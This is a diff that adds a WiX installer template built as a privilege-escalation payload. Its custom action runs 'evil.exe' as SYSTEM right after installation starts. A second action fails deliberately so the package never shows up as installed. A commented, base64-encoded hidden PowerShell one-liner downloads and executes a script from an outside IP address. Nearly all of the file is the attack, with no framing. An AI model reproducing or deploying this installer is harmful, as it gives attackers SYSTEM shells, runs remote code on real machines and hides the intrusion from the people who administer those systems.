@@ -1,0 +1,50 @@
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+   <Product 
+      Id="*" 
+      UpgradeCode="12345678-1234-1234-1234-111111111111" 
+      Name="Example Product Name" 
+      Version="0.0.1" 
+      Manufacturer="Example Company Name" 
+      Language="1033">
+      
+      <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package" InstallPrivileges="elevated"/>
+      <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
+
+
+      <Directory Id="TARGETDIR" Name="SourceDir">
+         <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222"/>               
+      </Directory>
+
+      <Feature Id="DefaultFeature" Level="1">
+         <ComponentRef Id="ApplicationFiles"/>
+      </Feature>
+
+<!-- Execute SYSTEM shell back either via executable or powershell one-liner -->
+<!-- ExeCommand  ='powershell -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA4AC4AMQAzADAAOgA4ADAALwBhACcAKQApAA==' -->
+      <CustomAction 
+         Id          ="a_system_shell"                     
+         Directory   ="TARGETDIR"
+         ExeCommand  ='C:\windows\tasks\evil.exe'
+         Return      ="asyncNoWait"
+         Execute     ="deferred"
+         Impersonate ="no"
+      />
+
+<!-- Attempt to execute nonexistant program, which causes installer to fail, so example.msi won't be registered as an installed program -->
+      <CustomAction 
+         Id          ="z_gonna_fail"                     
+         Directory   ="TARGETDIR"
+         ExeCommand  ='C:\asdfasdfasdf.exe'
+         Return      ="check"
+         Execute     ="deferred"
+         Impersonate ="no"
+      />
+
+   <InstallExecuteSequence>
+      <Custom Action="a_system_shell" After="InstallInitialize" /> 
+      <Custom Action="z_gonna_fail" Before="InstallFinalize" /> 
+   </InstallExecuteSequence>
+   
+   </Product>
+</Wix>
